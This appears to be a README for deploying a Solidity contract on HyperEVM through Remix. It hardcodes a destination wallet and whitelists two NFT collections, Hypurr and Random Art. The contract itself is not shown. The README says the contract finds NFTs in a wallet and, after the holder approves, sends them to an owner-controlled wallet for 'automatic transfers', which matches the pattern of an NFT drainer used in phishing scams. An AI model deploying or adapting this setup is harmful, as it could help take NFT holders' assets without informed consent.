# Contract Ready for Remix Deployment

## Contract File
Use: `contracts/HypurrNFTTransferSimple.sol`

This is a simplified non-upgradeable version that:
- ✅ Works exactly the same as upgradeable version
- ✅ Easier to deploy via Remix
- ✅ No proxy complexity
- ✅ All same functions and features

## Deployment Parameters

**Constructor Parameter:**
```
_destinationWallet = 0xbd24E200A8A7bE83c810039a073E18abD8362B6e
```

**After Deployment - Add Collections:**
1. `addNFTContract(0x9125e2d6827a00b0f8330d6ef7bef07730bac685)` - Hypurr
2. `addNFTContract(0x298AbE38965DC68d239192d4366ab8c5b65a3B6f)` - Random Art

## Quick Remix Steps

1. **Open Remix**: https://remix.ethereum.org
2. **Create File**: `contracts/HypurrNFTTransferSimple.sol`
3. **Copy Code**: From `contracts/HypurrNFTTransferSimple.sol`
4. **Import OpenZeppelin**: Use "Load from GitHub" → `OpenZeppelin/openzeppelin-contracts`
5. **Compile**: Solidity 0.8.20
6. **Deploy**: 
   - Environment: Injected Provider (MetaMask)
   - Network: HyperEVM (Chain ID: 999)
   - Constructor: `0xbd24E200A8A7bE83c810039a073E18abD8362B6e`
7. **Add Collections**: Call `addNFTContract` for both addresses

## What This Contract Does

- Checks if wallet has NFTs from enabled collections
- Transfers NFTs to destination wallet (after user approval)
- Supports multiple NFT collections
- Owner can add/remove collections
- Owner can change destination wallet
- Owner can pause/unpause

## Collections to Add

1. **Hypurr NFT**: `0x9125e2d6827a00b0f8330d6ef7bef07730bac685`
2. **Random Art NFT**: `0x298AbE38965DC68d239192d4366ab8c5b65a3B6f`

Both will be whitelisted and ready for automatic transfers!
